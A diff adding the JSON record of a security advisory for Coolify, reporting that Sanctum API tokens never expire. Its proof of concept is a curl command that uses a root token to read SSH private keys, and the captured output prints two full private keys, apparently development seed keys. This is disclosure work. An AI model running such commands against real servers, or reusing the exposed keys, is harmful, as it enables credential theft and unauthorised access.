@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-c83f-5ph7-x8xv",
+  "repo": {
+    "cve_id": "CVE-2026-42172",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "# API Tokens Never Expire\r\n- **Title:** Sanctum API Tokens Have No Expiration - Leaked Tokens Grant Permanent Access\r\n- **Severity:** Medium\r\n- **CVSS Score:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)\r\n\r\n**Impact:**\r\nOnce an API token is leaked (via logs, accidental commit, network interception), it provides permanent access with no automated revocation or expiry.\r\n\r\n**Affected File:** \r\n- `config/sanctum.php:49`\r\n\r\n**Root Cause:**\r\n```php\r\n'expiration' => null,\r\n```\r\n\r\n**Steps to Reproduce:**\r\n1. Create an API token with root ability.\r\n2. Use the token months later - it still works.\r\n3. Even if the user's password is changed, the API token remains valid.\r\n\r\n\r\n### Exploit\r\n```bash\r\n$ echo \"=== VULN-09: API Tokens Never Expire + Sensitive Data Exposure ===\"\r\necho \"The seeder created tokens with no expiration. Using 'root' token:\"\r\necho \"\"\r\necho \"1. Reading sensitive data (env vars, private keys, passwords):\"\r\ncurl -s http://localhost:8000/api/v1/security/keys \\\r\n  -H \"Authorization: Bearer root\" | python3 -m json.tool 2>/dev/null | head -30\r\necho \"\"\r\necho \"2. Checking token expiration config:\"\r\ndocker compose -f docker-compose.yml -f docker-compose.dev.yml exec coolify php artisan tinker --execute=\"\r\necho 'Sanctum expiration setting: ' . var_export(config('sanctum.expiration'), true);\r\necho PHP_EOL;\r\n\\$tokens = \\Laravel\\Sanctum\\PersonalAccessToken::all();\r\nforeach(\\$tokens as \\$t) {\r\n    echo 'Token: ' . \\$t->name . ' | expires_at: ' . var_export(\\$t->expires_at, true) . PHP_EOL;\r\n}\r\n\" 2>&1\r\n```\r\n**Output:**\r\n```text\r\n=== VULN-09: API Tokens Never Expire + Sensitive Data Exposure ===\r\nThe seeder created tokens with no expiration. Using 'root' token:\r\n1. Reading sensitive data (env vars, private keys, passwords):\r\n[\r\n    {\r\n        \"id\": 1,\r\n        \"uuid\": \"ssh\",\r\n        \"description\": \"This is a test docker container\",\r\n        \"name\": \"Testing Host Key\",\r\n        \"fingerprint\": \"WDF1BErfxg5i08eN33HIy+rf0GMWLQR8QRx0yiAaFbc\",\r\n        \"is_git_related\": false,\r\n        \"private_key\": \"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACBbhpqHhqv6aI67Mj9abM3DVbmcfYhZAhC7ca4d9UCevAAAAJi/QySHv0Mk\\nhwAAAAtzc2gtZWQyNTUxOQAAACBbhpqHhqv6aI67Mj9abM3DVbmcfYhZAhC7ca4d9UCevA\\nAAAECBQw4jg1WRT2IGHMncCiZhURCts2s24HoDS0thHnnRKVuGmoeGq/pojrsyP1pszcNV\\nuZx9iFkCELtxrh31QJ68AAAAEXNhaWxANzZmZjY2ZDJlMmRkAQIDBA==\\n-----END OPENSSH PRIVATE KEY-----\\n\",\r\n        \"public_key\": \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFuGmoeGq/pojrsyP1pszcNVuZx9iFkCELtxrh31QJ68 \",\r\n        \"team_id\": 0,\r\n        \"created_at\": \"2026-03-29T07:38:14.000000Z\",\r\n        \"updated_at\": \"2026-03-29T07:38:14.000000Z\"\r\n    },\r\n    {\r\n        \"id\": 2,\r\n        \"uuid\": \"github-key\",\r\n        \"description\": \"This is the key for using the development GitHub app\",\r\n        \"name\": \"development-github-app\",\r\n        \"fingerprint\": \"wPYrfxN5OhjWbgTCYenr1G1iaL5dPXClDb6ATH3S34I\",\r\n        \"is_git_related\": true,\r\n        \"private_key\": \"-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEAstJo/SfYh3tquc2BA29a1X3pdPpXazRgtKsb5fHOwQs1rE04\\nVyJYW6QCToSH4WS1oKt6iI4ma4uivn8rnkZFdw3mpcLp2ofcoeV3YPKX6pN/RiJC\\nif+g8gCaFywOxy2pjXOLPZeFJSXFqc4UOymbhESUyDnMfk4/RvnubMiv3jINo4Ow\\n4Tv7tRzAdMlMrx3hEhi142oQuyl1kc4WQOM9cAV0bd+62ga3EYSnsWTnC9AaFtWk\\neGC5w/7knHJ5QZ9tKApkG3/29vJXY7WwCRUROEHqkvQhRDP0uqRPBdR48iG87Dwq\\nePa6TodkFaVfyHS/OUZzRiTn6MOSyQQFg0QIIwIDAQABAoIBAQCsmGebSJU2lwl4\\n0oAeZ6E9hG0LagFsSL66QpkHxO9w5bflWRbzCwRLVy6eyE46XzDrJfd7y/ALR1hK\\nE4ZvGpY7heBDx7BdK1rprAggO6YjVD+42qJsfZ3DVo9jpDOTTWBkVcxkI1Xwd9ej\\nwHNIcy1WabdM1nSoyC9M+ziEKOOOShXc5Q6e+zEzSBbwjc1fvvXZOH4VXZZ1DllE\\nxGu0jFS23TLnXATxh8SdfYgnvfZgB5n72P9m/lj3FmkuJq57DLZhBwN3Zd4wom03\\nK7/J4K2Ssnjdv/HjVgrRgpMv7oMxfclN/Aiq878Ue4Mav6LjnLENyHbyR0WxQjY6\\nlZ7UMEeJAoGBAOCGepk3rCMFa3a6GagN6lYzAkLxB5y0PsefiDo6w+PeEj1tUvSd\\naQkiP7uvUC7a5GNp9yE8W79/O1jJXYJq15kMBpUshzfgdzyzDDCj+qvm6nbTWtP9\\nrP30h81R+NGdOStgs0OVZSjMWnIoii3Rv3UV4+iQXZd67+wd/kbTWtWVAoGBAMvj\\nxv4wjt7OwtK/6oAhcNd2V9EUQp6PPpMkUyPicWdsLsoNOcuTpWvEc0AomdIGGjgI\\nAIor1ggCxjEhbCDaZucOFUghciUup+PjyQyQT+3bjvCWuUmi0Vt51G7RE0jjZjQt\\n2+W9V4yDcJ5R5ow6veYvT0ZOjVTScDYowTBulgjXAoGBALFxVl7UotQiqmVwempY\\nZQSu13C0MIHl6V+2cuEiJEJn9R5a0h7EcIhpatkXmlUNZUY0Lr0ziIb1NJ/ctGwn\\nqDAqUuF+CXddjJ6KGm4uiiNlIZO7QaMcbqVdph3cVLrEeLQRfltBLGtr5WcnJt1D\\nUP5lyHK59V2MKSUAJz8uNjFpAoGAL5fR4Y/wKa5V5+AImzQzJPho81MpYd3KG4rF\\nJYE8O4oTOfLwZMboPEm1JWrUzSPDhwTHK3mkEmajYOCOXvTcRF8TNK0p+ef0JMwN\\nKDOflMRFj39/bOLmv9Wmct+3ArKiLtftlqkmAJTF+w7fJCiqH0s31A+OChi9PMcy\\noV2PBC0CgYAXOm08kFOQA+bPBdLAte8Ga89frh6asH/Z8ucfsz9/zMMG/hhq5nF3\\n7TItY9Pblc2Fp805J13G96zWLX4YGyLwXXkYs+Ae7QoqjonTw7/mUDARY1Zxs9m/\\na1C8EDKapCw5hAhizEFOUQKOygL8Ipn+tmEUkORYdZ8Q8cWFCv9nIw==\\n-----END RSA PRIVATE KEY-----\\n\",\r\n239:         \"public_key\": \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy0mj9J9iHe2q5zYEDb1rVfel0+ldrNGC0qxvl8c7BCzWsTThXIlhbpAJOhIfhZLWgq3qIjiZri6K+fyueRkV3Dealwunah9yh5Xdg8pfqk39GIkKJ/6DyAJoXLA7HLamNc4s9l4UlJcWpzhQ7KZuERJTIOcx+Tj9G+e5syK/eMg2jg7DhO/u1HMB0yUyvHeESGLXjahC7KXWRzhZA4z1wBXRt37raBrcRhKexZOcL0BoW1aR4YLnD/uSccnlBn20oCmQbf/b28ldjtbAJFRE4QeqS9CFEM/S6pE8F1HjyIbzsPCp49rpOh2QVpV/IdL85RnNGJOfow5LJBAWDRAgj \",\r\n240:         \"team_id\": 0,\r\n241:         \"created_at\": \"2026-03-29T07:38:14.000000Z\",\r\n242:         \"updated_at\": \"2026-03-29T07:38:14.000000Z\"\r\n243:     }\r\n244: ]\r\n245: 2. Checking token expiration config:\r\n246: Sanctum expiration setting: NULL\r\n247: Token: Development Read Sensitive Token | expires_at: NULL\r\n248: Token: Development Write Sensitive Token | expires_at: NULL\r\n249: Token: Development Deploy Token | expires_at: NULL\r\n250: Token: Development Write Token | expires_at: NULL\r\n251: Token: Development Read Token | expires_at: NULL\r\n252: Token: Development Root Token | expires_at: NULL\r\n```\r\n\r\n**Note**\r\nif you see output like this;\r\n```bash\r\nsanctum.expiration = NULL\r\nDevelopment Read Sensitive Token => expires_at: NEVER\r\nDevelopment Write Sensitive Token => expires_at: NEVER\r\nDevelopment Deploy Token => expires_at: NEVER\r\nDevelopment Read Token => expires_at: NEVER\r\nDevelopment Write Token => expires_at: NEVER\r\nDevelopment Root Token => expires_at: NEVER\r\n[VERDICT] Root token exposes full SSH private keys in plaintext.\r\n          All tokens have NULL expiration - they NEVER expire.\r\n          A leaked token provides permanent access with no auto-revocation.\r\n```\r\nThen it means, The keys endpoint returned empty because the IP allowlist reset may have invalidated the cache. Try these command:\r\n\r\n```bash\r\necho \"[*] SSH Private Keys via root API token:\"\r\ncurl -s http://localhost:8000/api/v1/security/keys \\\r\n  -H \"Authorization: Bearer root\" | python3 -m json.tool 2>/dev/null | head -40\r\n```\r\n\r\n\r\n**CONFIRMED** -- all tokens have NULL expiration. The root token also leaked full SSH private keys. Full SSH private keys leaked via the root API token which never expires.\r\n\r\nImage POC:\r\n\r\n<img width=\"1914\" height=\"1012\" alt=\"POC9image\" src=\"https://github.com/user-attachments/assets/7e7c4817-9fe6-4019-a7e3-92509b08c647\" />\r\n\r\n\r\n**Remediation:**\r\n- Set a reasonable expiration (e.g., 90 days): `'expiration' => 129600`\r\n- Implement token rotation mechanisms.\r\n- Log last-used timestamps for tokens and alert on stale tokens.",
+    "ghsa_id": "GHSA-c83f-5ph7-x8xv",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-c83f-5ph7-x8xv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-c83f-5ph7-x8xv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42172"
+      }
+    ],
+    "published_at": "2026-07-02T16:36:02Z",
+    "references": [],
+    "severity": "low",
+    "summary": "Sanctum API Tokens Have No Expiration - Leaked Tokens Grant Permanent Access",
+    "updated_at": "2026-07-02T16:36:02Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": "<= 4.0.0-beta.473"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
